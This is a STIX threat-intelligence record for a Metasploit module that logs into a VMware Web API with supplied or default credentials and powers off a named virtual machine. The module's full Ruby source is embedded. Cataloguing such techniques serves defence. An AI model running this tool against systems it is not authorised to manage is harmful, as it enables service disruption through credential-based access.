{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f2f983ca-690c-4b37-b509-a28bdf4fb2b0",
    "created": "2024-08-14T16:22:41.589684Z",
    "modified": "2024-08-14T16:22:41.589688Z",
    "name": "VMWare Power Off Virtual Machine",
    "description": "Q This module will log into the Web API of VMWare and try to power off a specified Virtual Machine.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/vmware/poweroff_vm.rb",
            "external_id": "poweroff_vm.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::VIMSoap\n\n  def initialize\n    super(\n      'Name'           => 'VMWare Power Off Virtual Machine',\n      'Description'    => %Q{\n        This module will log into the Web API of VMWare and try to power off\n        a specified Virtual Machine.},\n      'Author'         => ['theLightCosine'],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true }\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [ true, \"The username to Authenticate with.\", 'root' ]),\n        OptString.new('PASSWORD', [ true, \"The password to Authenticate with.\", 'password' ]),\n        OptString.new('VM', [true, \"The VM to try to Power Off\"])\n      ])\n  end\n\n  def run\n    if vim_do_login(datastore['USERNAME'], datastore['PASSWORD']) == :success\n      vm_ref = vim_find_vm_by_name(datastore['VM'])\n      case vm_ref\n      when String\n        return_state = vim_powerOFF_vm(vm_ref)\n        case return_state\n        when 'success'\n          print_good \"VM Powered Off Successfully\"\n        when 'alreadyOFF'\n          print_status \"The Server says that VM #{datastore['VM']} is already off.\"\n        else\n          print_error \"The server returned an unexpected status #{return_state}\"\n        end\n      when :noresponse\n        print_error \"The request timed out\"\n      when :error\n        print_error @vim_soap_error\n      when nil\n        print_error \"Could not locate VM #{datastore['VM']}\"\n      end\n    else\n      print_error \"Login Failure on #{datastore['RHOST']}\"\n      return\n    end\n  end\nend\n"
}